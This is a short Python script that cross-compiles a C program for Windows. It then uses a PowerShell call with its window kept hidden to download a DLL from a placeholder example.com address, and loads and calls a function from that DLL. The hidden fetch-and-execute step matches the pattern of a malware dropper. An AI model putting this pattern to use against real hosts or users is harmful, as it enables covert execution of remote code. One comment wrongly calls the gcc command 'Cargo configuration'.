import subprocess
import os
import ctypes

# Define paths and URLs
c_program_source = "program.c"
windows_executable = "program.exe"
dll_name = "example.dll"
dll_url = "https://example.com/path/to/example.dll"
dll_local_path = "./example.dll"

# Cargo configuration for cross-compilation
cross_compile_command = [
    "x86_64-w64-mingw32-gcc",  # Cross-compiler for Windows on Linux
    c_program_source,
    "-o",
    windows_executable
]

def compile_c_program():
    """Compile the C program for Windows using x86_64-w64-mingw32-gcc."""
    print("Compiling C program for Windows...")
    result = subprocess.run(cross_compile_command, capture_output=True, text=True)
    
    if result.returncode != 0:
        print("Compilation failed:")
        print(result.stderr)
    else:
        print("Compilation succeeded! Windows executable created:", windows_executable)

def download_dll():
    """Download DLL file using PowerShell and ensure the PowerShell window remains hidden."""
    print("Downloading DLL...")
    ps_command = f'Invoke-WebRequest -Uri {dll_url} -OutFile {dll_local_path} -UseBasicParsing'
    powershell_command = [
        "powershell", "-WindowStyle", "Hidden", "-Command", ps_command
    ]
    
    result = subprocess.run(powershell_command, capture_output=True, text=True)
    
    if result.returncode != 0:
        print("Failed to download DLL:")
        print(result.stderr)
    else:
        print("DLL downloaded successfully:", dll_local_path)

def load_dll_and_invoke_function():
    """Load the DLL and invoke a function from it."""
    if not os.path.exists(dll_local_path):
        print("DLL file does not exist. Cannot proceed.")
        return
    
    # Load the DLL
    dll = ctypes.CDLL(dll_local_path)
    
    # Assume the DLL has a function called 'ExampleFunction' with no parameters and no return value
    try:
        example_function = dll.ExampleFunction
        example_function.restype = None
        example_function.argtypes = []
        print("Invoking function 'ExampleFunction' from the DLL...")
        example_function()
        print("Function invoked successfully.")
    except AttributeError:
        print("Function 'ExampleFunction' not found in the DLL.")

def main():
    # Compile the C program for Windows
    compile_c_program()
    
    # Download the required DLL using PowerShell
    download_dll()
    
    # Load the DLL and invoke a function
    load_dll_and_invoke_function()

if __name__ == "__main__":
    main()